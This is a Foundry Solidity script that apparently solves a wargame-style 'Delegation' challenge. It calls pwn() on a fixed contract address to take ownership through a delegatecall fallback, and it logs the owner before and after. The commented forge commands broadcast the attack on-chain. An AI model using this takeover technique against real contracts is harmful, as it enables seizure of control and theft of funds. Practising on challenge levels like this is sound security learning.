// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationHack is Script {
    Delegation public delegation =
        Delegation(payable(0x0a59983f0097F925A7d1ae70B866492f96B84A5B));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before hack", delegation.owner());

        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);

        console.log("Owner after hack", delegation.owner());

        vm.stopBroadcast();
    }
}

// forge script script/Delegation.s.sol -vv
// forge script script/Delegation.s.sol -vv --broadcast
